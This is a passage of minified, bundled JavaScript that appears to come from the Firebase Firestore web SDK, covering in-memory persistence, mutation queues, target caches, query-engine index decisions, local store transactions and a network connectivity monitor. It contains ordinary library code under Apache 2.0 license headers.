 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class PF{constructor(){this.sessionToken=Vn.EMPTY_BYTE_STRING}getSessionToken(e){return re.resolve(this.sessionToken)}setSessionToken(e,t){return this.sessionToken=t,re.resolve()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Nv{constructor(){this.Vr=new yn(In.mr),this.gr=new yn(In.pr)}isEmpty(){return this.Vr.isEmpty()}addReference(e,t){const r=new In(e,t);this.Vr=this.Vr.add(r),this.gr=this.gr.add(r)}yr(e,t){e.forEach(r=>this.addReference(r,t))}removeReference(e,t){this.wr(new In(e,t))}Sr(e,t){e.forEach(r=>this.removeReference(r,t))}br(e){const t=new Se(new Mt([])),r=new In(t,e),i=new In(t,e+1),s=[];return this.gr.forEachInRange([r,i],o=>{this.wr(o),s.push(o.key)}),s}Dr(){this.Vr.forEach(e=>this.wr(e))}wr(e){this.Vr=this.Vr.delete(e),this.gr=this.gr.delete(e)}vr(e){const t=new Se(new Mt([])),r=new In(t,e),i=new In(t,e+1);let s=Ye();return this.gr.forEachInRange([r,i],o=>{s=s.add(o.key)}),s}containsKey(e){const t=new In(e,0),r=this.Vr.firstAfterOrEqual(t);return r!==null&&e.isEqual(r.key)}}class In{constructor(e,t){this.key=e,this.Cr=t}static mr(e,t){return Se.comparator(e.key,t.key)||$e(e.Cr,t.Cr)}static pr(e,t){return $e(e.Cr,t.Cr)||Se.comparator(e.key,t.key)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class LF{constructor(e,t){this.indexManager=e,this.referenceDelegate=t,this.mutationQueue=[],this.Fr=1,this.Mr=new yn(In.mr)}checkEmpty(e){return re.resolve(this.mutationQueue.length===0)}addMutationBatch(e,t,r,i){const s=this.Fr;this.Fr++,this.mutationQueue.length>0&&this.mutationQueue[this.mutationQueue.length-1];const o=new YV(s,t,r,i);this.mutationQueue.push(o);for(const a of i)this.Mr=this.Mr.add(new In(a.key,s)),this.indexManager.addToCollectionParentIndex(e,a.key.path.popLast());return re.resolve(o)}lookupMutationBatch(e,t){return re.resolve(this.Or(t))}getNextMutationBatchAfterBatchId(e,t){const r=t+1,i=this.Nr(r),s=i<0?0:i;return re.resolve(this.mutationQueue.length>s?this.mutationQueue[s]:null)}getHighestUnacknowledgedBatchId(){return re.resolve(this.mutationQueue.length===0?Iv:this.Fr-1)}getAllMutationBatches(e){return re.resolve(this.mutationQueue.slice())}getAllMutationBatchesAffectingDocumentKey(e,t){const r=new In(t,0),i=new In(t,Number.POSITIVE_INFINITY),s=[];return this.Mr.forEachInRange([r,i],o=>{const a=this.Or(o.Cr);s.push(a)}),re.resolve(s)}getAllMutationBatchesAffectingDocumentKeys(e,t){let r=new yn($e);return t.forEach(i=>{const s=new In(i,0),o=new In(i,Number.POSITIVE_INFINITY);this.Mr.forEachInRange([s,o],a=>{r=r.add(a.Cr)})}),re.resolve(this.Br(r))}getAllMutationBatchesAffectingQuery(e,t){const r=t.path,i=r.length+1;let s=r;Se.isDocumentKey(s)||(s=s.child(""));const o=new In(new Se(s),0);let a=new yn($e);return this.Mr.forEachWhile(l=>{const u=l.key.path;return!!r.isPrefixOf(u)&&(u.length===i&&(a=a.add(l.Cr)),!0)},o),re.resolve(this.Br(a))}Br(e){const t=[];return e.forEach(r=>{const i=this.Or(r);i!==null&&t.push(i)}),t}removeMutationBatch(e,t){st(this.Lr(t.batchId,"removed")===0),this.mutationQueue.shift();let r=this.Mr;return re.forEach(t.mutations,i=>{const s=new In(i.key,t.batchId);return r=r.delete(s),this.referenceDelegate.markPotentiallyOrphaned(e,i.key)}).next(()=>{this.Mr=r})}qn(e){}containsKey(e,t){const r=new In(t,0),i=this.Mr.firstAfterOrEqual(r);return re.resolve(t.isEqual(i&&i.key))}performConsistencyCheck(e){return this.mutationQueue.length,re.resolve()}Lr(e,t){return this.Nr(e)}Nr(e){return this.mutationQueue.length===0?0:e-this.mutationQueue[0].batchId}Or(e){const t=this.Nr(e);return t<0||t>=this.mutationQueue.length?null:this.mutationQueue[t]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class DF{constructor(e){this.kr=e,this.docs=function(){return new Qt(Se.comparator)}(),this.size=0}setIndexManager(e){this.indexManager=e}addEntry(e,t){const r=t.key,i=this.docs.get(r),s=i?i.size:0,o=this.kr(t);return this.docs=this.docs.insert(r,{document:t.mutableCopy(),size:o}),this.size+=o-s,this.indexManager.addToCollectionParentIndex(e,r.path.popLast())}removeEntry(e){const t=this.docs.get(e);t&&(this.docs=this.docs.remove(e),this.size-=t.size)}getEntry(e,t){const r=this.docs.get(t);return re.resolve(r?r.document.mutableCopy():Xn.newInvalidDocument(t))}getEntries(e,t){let r=ds();return t.forEach(i=>{const s=this.docs.get(i);r=r.insert(i,s?s.document.mutableCopy():Xn.newInvalidDocument(i))}),re.resolve(r)}getDocumentsMatchingQuery(e,t,r,i){let s=ds();const o=t.path,a=new Se(o.child("__id-9223372036854775808__")),l=this.docs.getIteratorFrom(a);for(;l.hasNext();){const{key:u,value:{document:h}}=l.getNext();if(!o.isPrefixOf(u.path))break;u.path.length>o.length+1||fV(hV(h),r)<=0||(i.has(h.key)||Hp(t,h))&&(s=s.insert(h.key,h.mutableCopy()))}return re.resolve(s)}getAllFromCollectionGroup(e,t,r,i){Me()}qr(e,t){return re.forEach(this.docs,r=>t(r))}newChangeBuffer(e){return new OF(this)}getSize(e){return re.resolve(this.size)}}class OF extends kF{constructor(e){super(),this.Ir=e}applyChanges(e){const t=[];return this.changes.forEach((r,i)=>{i.isValidDocument()?t.push(this.Ir.addEntry(e,i)):this.Ir.removeEntry(r)}),re.waitFor(t)}getFromCache(e,t){return this.Ir.getEntry(e,t)}getAllFromCache(e,t){return this.Ir.getEntries(e,t)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class BF{constructor(e){this.persistence=e,this.Qr=new va(t=>Av(t),bv),this.lastRemoteSnapshotVersion=De.min(),this.highestTargetId=0,this.$r=0,this.Ur=new Nv,this.targetCount=0,this.Kr=Fl.Un()}forEachTarget(e,t){return this.Qr.forEach((r,i)=>t(i)),re.resolve()}getLastRemoteSnapshotVersion(e){return re.resolve(this.lastRemoteSnapshotVersion)}getHighestSequenceNumber(e){return re.resolve(this.$r)}allocateTargetId(e){return this.highestTargetId=this.Kr.next(),re.resolve(this.highestTargetId)}setTargetsMetadata(e,t,r){return r&&(this.lastRemoteSnapshotVersion=r),t>this.$r&&(this.$r=t),re.resolve()}zn(e){this.Qr.set(e.target,e);const t=e.targetId;t>this.highestTargetId&&(this.Kr=new Fl(t),this.highestTargetId=t),e.sequenceNumber>this.$r&&(this.$r=e.sequenceNumber)}addTargetData(e,t){return this.zn(t),this.targetCount+=1,re.resolve()}updateTargetData(e,t){return this.zn(t),re.resolve()}removeTargetData(e,t){return this.Qr.delete(t.target),this.Ur.br(t.targetId),this.targetCount-=1,re.resolve()}removeTargets(e,t,r){let i=0;const s=[];return this.Qr.forEach((o,a)=>{a.sequenceNumber<=t&&r.get(a.targetId)===null&&(this.Qr.delete(o),s.push(this.removeMatchingKeysForTargetId(e,a.targetId)),i++)}),re.waitFor(s).next(()=>i)}getTargetCount(e){return re.resolve(this.targetCount)}getTargetData(e,t){const r=this.Qr.get(t)||null;return re.resolve(r)}addMatchingKeys(e,t,r){return this.Ur.yr(t,r),re.resolve()}removeMatchingKeys(e,t,r){this.Ur.Sr(t,r);const i=this.persistence.referenceDelegate,s=[];return i&&t.forEach(o=>{s.push(i.markPotentiallyOrphaned(e,o))}),re.waitFor(s)}removeMatchingKeysForTargetId(e,t){return this.Ur.br(t),re.resolve()}getMatchingKeysForTargetId(e,t){const r=this.Ur.vr(t);return re.resolve(r)}containsKey(e,t){return re.resolve(this.Ur.containsKey(t))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Dk{constructor(e,t){this.Wr={},this.overlays={},this.Gr=new Fp(0),this.zr=!1,this.zr=!0,this.jr=new PF,this.referenceDelegate=e(this),this.Hr=new BF(this),this.indexManager=new EF,this.remoteDocumentCache=function(i){return new DF(i)}(r=>this.referenceDelegate.Jr(r)),this.serializer=new vF(t),this.Yr=new MF(this.serializer)}start(){return Promise.resolve()}shutdown(){return this.zr=!1,Promise.resolve()}get started(){return this.zr}setDatabaseDeletedListener(){}setNetworkEnabled(){}getIndexManager(e){return this.indexManager}getDocumentOverlayCache(e){let t=this.overlays[e.toKey()];return t||(t=new NF,this.overlays[e.toKey()]=t),t}getMutationQueue(e,t){let r=this.Wr[e.toKey()];return r||(r=new LF(t,this.referenceDelegate),this.Wr[e.toKey()]=r),r}getGlobalsCache(){return this.jr}getTargetCache(){return this.Hr}getRemoteDocumentCache(){return this.remoteDocumentCache}getBundleCache(){return this.Yr}runTransaction(e,t,r){me("MemoryPersistence","Starting transaction:",e);const i=new UF(this.Gr.next());return this.referenceDelegate.Zr(),r(i).next(s=>this.referenceDelegate.Xr(i).next(()=>s)).toPromise().then(s=>(i.raiseOnCommittedEvent(),s))}ei(e,t){return re.or(Object.values(this.Wr).map(r=>()=>r.containsKey(e,t)))}}class UF extends pV{constructor(e){super(),this.currentSequenceNumber=e}}class Pv{constructor(e){this.persistence=e,this.ti=new Nv,this.ni=null}static ri(e){return new Pv(e)}get ii(){if(this.ni)return this.ni;throw Me()}addReference(e,t,r){return this.ti.addReference(r,t),this.ii.delete(r.toString()),re.resolve()}removeReference(e,t,r){return this.ti.removeReference(r,t),this.ii.add(r.toString()),re.resolve()}markPotentiallyOrphaned(e,t){return this.ii.add(t.toString()),re.resolve()}removeTarget(e,t){this.ti.br(t.targetId).forEach(i=>this.ii.add(i.toString()));const r=this.persistence.getTargetCache();return r.getMatchingKeysForTargetId(e,t.targetId).next(i=>{i.forEach(s=>this.ii.add(s.toString()))}).next(()=>r.removeTargetData(e,t))}Zr(){this.ni=new Set}Xr(e){const t=this.persistence.getRemoteDocumentCache().newChangeBuffer();return re.forEach(this.ii,r=>{const i=Se.fromPath(r);return this.si(e,i).next(s=>{s||t.removeEntry(i,De.min())})}).next(()=>(this.ni=null,t.apply(e)))}updateLimboDocument(e,t){return this.si(e,t).next(r=>{r?this.ii.delete(t.toString()):this.ii.add(t.toString())})}Jr(e){return 0}si(e,t){return re.or([()=>re.resolve(this.ti.containsKey(t)),()=>this.persistence.getTargetCache().containsKey(e,t),()=>this.persistence.ei(e,t)])}}class zd{constructor(e,t){this.persistence=e,this.oi=new va(r=>yV(r.path),(r,i)=>r.isEqual(i)),this.garbageCollector=xF(this,t)}static ri(e,t){return new zd(e,t)}Zr(){}Xr(e){return re.resolve()}forEachTarget(e,t){return this.persistence.getTargetCache().forEachTarget(e,t)}nr(e){const t=this.sr(e);return this.persistence.getTargetCache().getTargetCount(e).next(r=>t.next(i=>r+i))}sr(e){let t=0;return this.rr(e,r=>{t++}).next(()=>t)}rr(e,t){return re.forEach(this.oi,(r,i)=>this.ar(e,r,i).next(s=>s?re.resolve():t(i)))}removeTargets(e,t,r){return this.persistence.getTargetCache().removeTargets(e,t,r)}removeOrphanedDocuments(e,t){let r=0;const i=this.persistence.getRemoteDocumentCache(),s=i.newChangeBuffer();return i.qr(e,o=>this.ar(e,o,t).next(a=>{a||(r++,s.removeEntry(o,De.min()))})).next(()=>s.apply(e)).next(()=>r)}markPotentiallyOrphaned(e,t){return this.oi.set(t,e.currentSequenceNumber),re.resolve()}removeTarget(e,t){const r=t.withSequenceNumber(e.currentSequenceNumber);return this.persistence.getTargetCache().updateTargetData(e,r)}addReference(e,t,r){return this.oi.set(r,e.currentSequenceNumber),re.resolve()}removeReference(e,t,r){return this.oi.set(r,e.currentSequenceNumber),re.resolve()}updateLimboDocument(e,t){return this.oi.set(t,e.currentSequenceNumber),re.resolve()}Jr(e){let t=e.key.toString().length;return e.isFoundDocument()&&(t+=Df(e.data.value)),t}ar(e,t,r){return re.or([()=>this.persistence.ei(e,t),()=>this.persistence.getTargetCache().containsKey(e,t),()=>{const i=this.oi.get(t);return re.resolve(i!==void 0&&i>r)}])}getCacheSize(e){return this.persistence.getRemoteDocumentCache().getSize(e)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Lv{constructor(e,t,r,i){this.targetId=e,this.fromCache=t,this.Hi=r,this.Ji=i}static Yi(e,t){let r=Ye(),i=Ye();for(const s of t.docChanges)switch(s.type){case 0:r=r.add(s.doc.key);break;case 1:i=i.add(s.doc.key)}return new Lv(e,t.fromCache,r,i)}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class jF{constructor(){this._documentReadCount=0}get documentReadCount(){return this._documentReadCount}incrementDocumentReadCount(e){this._documentReadCount+=e}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class VF{constructor(){this.Zi=!1,this.Xi=!1,this.es=100,this.ts=function(){return y5()?8:gV(nr())>0?6:4}()}initialize(e,t){this.ns=e,this.indexManager=t,this.Zi=!0}getDocumentsMatchingQuery(e,t,r,i){const s={result:null};return this.rs(e,t).next(o=>{s.result=o}).next(()=>{if(!s.result)return this.ss(e,t,i,r).next(o=>{s.result=o})}).next(()=>{if(s.result)return;const o=new jF;return this._s(e,t,o).next(a=>{if(s.result=a,this.Xi)return this.us(e,t,o,a.size)})}).next(()=>s.result)}us(e,t,r,i){return r.documentReadCount<this.es?(ja()<=Qe.DEBUG&&me("QueryEngine","SDK will not create cache indexes for query:",Va(t),"since it only creates cache indexes for collection contains","more than or equal to",this.es,"documents"),re.resolve()):(ja()<=Qe.DEBUG&&me("QueryEngine","Query:",Va(t),"scans",r.documentReadCount,"local documents and returns",i,"documents as results."),r.documentReadCount>this.ts*i?(ja()<=Qe.DEBUG&&me("QueryEngine","The SDK decides to create cache indexes for query:",Va(t),"as using cache indexes may help improve performance."),this.indexManager.createTargetIndexes(e,bi(t))):re.resolve())}rs(e,t){if(VI(t))return re.resolve(null);let r=bi(t);return this.indexManager.getIndexType(e,r).next(i=>i===0?null:(t.limit!==null&&i===1&&(t=vy(t,null,"F"),r=bi(t)),this.indexManager.getDocumentsMatchingTarget(e,r).next(s=>{const o=Ye(...s);return this.ns.getDocuments(e,o).next(a=>this.indexManager.getMinOffset(e,r).next(l=>{const u=this.cs(t,a);return this.ls(t,u,o,l.readTime)?this.rs(e,vy(t,null,"F")):this.hs(e,u,t,l)}))})))}ss(e,t,r,i){return VI(t)||i.isEqual(De.min())?re.resolve(null):this.ns.getDocuments(e,r).next(s=>{const o=this.cs(t,s);return this.ls(t,o,r,i)?re.resolve(null):(ja()<=Qe.DEBUG&&me("QueryEngine","Re-using previous result from %s to execute query: %s",i.toString(),Va(t)),this.hs(e,o,t,uV(i,zu)).next(a=>a))})}cs(e,t){let r=new yn(fk(e));return t.forEach((i,s)=>{Hp(e,s)&&(r=r.add(s))}),r}ls(e,t,r,i){if(e.limit===null)return!1;if(r.size!==t.size)return!0;const s=e.limitType==="F"?t.last():t.first();return!!s&&(s.hasPendingWrites||s.version.compareTo(i)>0)}_s(e,t,r){return ja()<=Qe.DEBUG&&me("QueryEngine","Using full collection scan to execute query:",Va(t)),this.ns.getDocumentsMatchingQuery(e,t,lo.min(),r)}hs(e,t,r,i){return this.ns.getDocumentsMatchingQuery(e,r,i).next(s=>(t.forEach(o=>{s=s.insert(o.key,o)}),s))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Dv="LocalStore",FF=3e8;class zF{constructor(e,t,r,i){this.persistence=e,this.Ps=t,this.serializer=i,this.Ts=new Qt($e),this.Is=new va(s=>Av(s),bv),this.Es=new Map,this.ds=e.getRemoteDocumentCache(),this.Hr=e.getTargetCache(),this.Yr=e.getBundleCache(),this.As(r)}As(e){this.documentOverlayCache=this.persistence.getDocumentOverlayCache(e),this.indexManager=this.persistence.getIndexManager(e),this.mutationQueue=this.persistence.getMutationQueue(e,this.indexManager),this.localDocuments=new RF(this.ds,this.mutationQueue,this.documentOverlayCache,this.indexManager),this.ds.setIndexManager(this.indexManager),this.Ps.initialize(this.localDocuments,this.indexManager)}collectGarbage(e){return this.persistence.runTransaction("Collect garbage","readwrite-primary",t=>e.collect(t,this.Ts))}}function WF(n,e,t,r){return new zF(n,e,t,r)}async function Ok(n,e){const t=Be(n);return await t.persistence.runTransaction("Handle user change","readonly",r=>{let i;return t.mutationQueue.getAllMutationBatches(r).next(s=>(i=s,t.As(e),t.mutationQueue.getAllMutationBatches(r))).next(s=>{const o=[],a=[];let l=Ye();for(const u of i){o.push(u.batchId);for(const h of u.mutations)l=l.add(h.key)}for(const u of s){a.push(u.batchId);for(const h of u.mutations)l=l.add(h.key)}return t.localDocuments.getDocuments(r,l).next(u=>({Rs:u,removedBatchIds:o,addedBatchIds:a}))})})}function $F(n,e){const t=Be(n);return t.persistence.runTransaction("Acknowledge batch","readwrite-primary",r=>{const i=e.batch.keys(),s=t.ds.newChangeBuffer({trackRemovals:!0});return function(a,l,u,h){const f=u.batch,m=f.keys();let v=re.resolve();return m.forEach(x=>{v=v.next(()=>h.getEntry(l,x)).next(k=>{const I=u.docVersions.get(x);st(I!==null),k.version.compareTo(I)<0&&(f.applyToRemoteDocument(k,u),k.isValidDocument()&&(k.setReadTime(u.commitVersion),h.addEntry(k)))})}),v.next(()=>a.mutationQueue.removeMutationBatch(l,f))}(t,r,e,s).next(()=>s.apply(r)).next(()=>t.mutationQueue.performConsistencyCheck(r)).next(()=>t.documentOverlayCache.removeOverlaysForBatchId(r,i,e.batch.batchId)).next(()=>t.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(r,function(a){let l=Ye();for(let u=0;u<a.mutationResults.length;++u)a.mutationResults[u].transformResults.length>0&&(l=l.add(a.batch.mutations[u].key));return l}(e))).next(()=>t.localDocuments.getDocuments(r,i))})}function Bk(n){const e=Be(n);return e.persistence.runTransaction("Get last remote snapshot version","readonly",t=>e.Hr.getLastRemoteSnapshotVersion(t))}function HF(n,e){const t=Be(n),r=e.snapshotVersion;let i=t.Ts;return t.persistence.runTransaction("Apply remote event","readwrite-primary",s=>{const o=t.ds.newChangeBuffer({trackRemovals:!0});i=t.Ts;const a=[];e.targetChanges.forEach((h,f)=>{const m=i.get(f);if(!m)return;a.push(t.Hr.removeMatchingKeys(s,h.removedDocuments,f).next(()=>t.Hr.addMatchingKeys(s,h.addedDocuments,f)));let v=m.withSequenceNumber(s.currentSequenceNumber);e.targetMismatches.get(f)!==null?v=v.withResumeToken(Vn.EMPTY_BYTE_STRING,De.min()).withLastLimboFreeSnapshotVersion(De.min()):h.resumeToken.approximateByteSize()>0&&(v=v.withResumeToken(h.resumeToken,r)),i=i.insert(f,v),function(k,I,S){return k.resumeToken.approximateByteSize()===0||I.snapshotVersion.toMicroseconds()-k.snapshotVersion.toMicroseconds()>=FF?!0:S.addedDocuments.size+S.modifiedDocuments.size+S.removedDocuments.size>0}(m,v,h)&&a.push(t.Hr.updateTargetData(s,v))});let l=ds(),u=Ye();if(e.documentUpdates.forEach(h=>{e.resolvedLimboDocuments.has(h)&&a.push(t.persistence.referenceDelegate.updateLimboDocument(s,h))}),a.push(qF(s,o,e.documentUpdates).next(h=>{l=h.Vs,u=h.fs})),!r.isEqual(De.min())){const h=t.Hr.getLastRemoteSnapshotVersion(s).next(f=>t.Hr.setTargetsMetadata(s,s.currentSequenceNumber,r));a.push(h)}return re.waitFor(a).next(()=>o.apply(s)).next(()=>t.localDocuments.getLocalViewOfDocuments(s,l,u)).next(()=>l)}).then(s=>(t.Ts=i,s))}function qF(n,e,t){let r=Ye(),i=Ye();return t.forEach(s=>r=r.add(s)),e.getEntries(n,r).next(s=>{let o=ds();return t.forEach((a,l)=>{const u=s.get(a);l.isFoundDocument()!==u.isFoundDocument()&&(i=i.add(a)),l.isNoDocument()&&l.version.isEqual(De.min())?(e.removeEntry(a,l.readTime),o=o.insert(a,l)):!u.isValidDocument()||l.version.compareTo(u.version)>0||l.version.compareTo(u.version)===0&&u.hasPendingWrites?(e.addEntry(l),o=o.insert(a,l)):me(Dv,"Ignoring outdated watch update for ",a,". Current version:",u.version," Watch version:",l.version)}),{Vs:o,fs:i}})}function KF(n,e){const t=Be(n);return t.persistence.runTransaction("Get next mutation batch","readonly",r=>(e===void 0&&(e=Iv),t.mutationQueue.getNextMutationBatchAfterBatchId(r,e)))}function GF(n,e){const t=Be(n);return t.persistence.runTransaction("Allocate target","readwrite",r=>{let i;return t.Hr.getTargetData(r,e).next(s=>s?(i=s,re.resolve(i)):t.Hr.allocateTargetId(r).next(o=>(i=new zs(e,o,"TargetPurposeListen",r.currentSequenceNumber),t.Hr.addTargetData(r,i).next(()=>i))))}).then(r=>{const i=t.Ts.get(r.targetId);return(i===null||r.snapshotVersion.compareTo(i.snapshotVersion)>0)&&(t.Ts=t.Ts.insert(r.targetId,r),t.Is.set(e,r.targetId)),r})}async function Ty(n,e,t){const r=Be(n),i=r.Ts.get(e),s=t?"readwrite":"readwrite-primary";try{t||await r.persistence.runTransaction("Release target",s,o=>r.persistence.referenceDelegate.removeTarget(o,i))}catch(o){if(!sc(o))throw o;me(Dv,`Failed to update sequence numbers for target ${e}: ${o}`)}r.Ts=r.Ts.remove(e),r.Is.delete(i.target)}function XI(n,e,t){const r=Be(n);let i=De.min(),s=Ye();return r.persistence.runTransaction("Execute query","readwrite",o=>function(l,u,h){const f=Be(l),m=f.Is.get(h);return m!==void 0?re.resolve(f.Ts.get(m)):f.Hr.getTargetData(u,h)}(r,o,bi(e)).next(a=>{if(a)return i=a.lastLimboFreeSnapshotVersion,r.Hr.getMatchingKeysForTargetId(o,a.targetId).next(l=>{s=l})}).next(()=>r.Ps.getDocumentsMatchingQuery(o,e,t?i:De.min(),t?s:Ye())).next(a=>(QF(r,DV(e),a),{documents:a,gs:s})))}function QF(n,e,t){let r=n.Es.get(e)||De.min();t.forEach((i,s)=>{s.readTime.compareTo(r)>0&&(r=s.readTime)}),n.Es.set(e,r)}class eS{constructor(){this.activeTargetIds=FV()}Ds(e){this.activeTargetIds=this.activeTargetIds.add(e)}vs(e){this.activeTargetIds=this.activeTargetIds.delete(e)}bs(){const e={activeTargetIds:this.activeTargetIds.toArray(),updateTimeMs:Date.now()};return JSON.stringify(e)}}class YF{constructor(){this.ho=new eS,this.Po={},this.onlineStateHandler=null,this.sequenceNumberHandler=null}addPendingMutation(e){}updateMutationState(e,t,r){}addLocalQueryTarget(e,t=!0){return t&&this.ho.Ds(e),this.Po[e]||"not-current"}updateQueryState(e,t,r){this.Po[e]=t}removeLocalQueryTarget(e){this.ho.vs(e)}isLocalQueryTarget(e){return this.ho.activeTargetIds.has(e)}clearQueryState(e){delete this.Po[e]}getAllActiveQueryTargets(){return this.ho.activeTargetIds}isActiveQueryTarget(e){return this.ho.activeTargetIds.has(e)}start(){return this.ho=new eS,Promise.resolve()}handleUserChange(e,t,r){}setOnlineState(e){}shutdown(){}writeSequenceNumber(e){}notifyBundleLoaded(e){}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ZF{To(e){}shutdown(){}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const tS="ConnectivityMonitor";class nS{constructor(){this.Io=()=>this.Eo(),this.Ao=()=>this.Ro(),this.Vo=[],this.mo()}To(e){this.Vo.push(e)}shutdown(){window.removeEventListener("online",this.Io),window.removeEventListener("offline",this.Ao)}mo(){window.addEventListener("online",this.Io),window.addEventListener("offline",this.Ao)}Eo(){me(tS,"Network connectivity changed: AVAILABLE");for(const e of this.Vo)e(0)}Ro(){me(tS,"Network connectivity changed: UNAVAILABLE");for(const e of this.Vo)e(1)}static D(){return typeof window<"u"&&window.addEventListener!==void 0&&window.removeEventListener!==void 0}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let hf=null;function Ay(){return hf===null?hf=function(){return 268435456+Math.round(2147483648*Math.random())}():hf++,"0x"+hf.toString(16)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
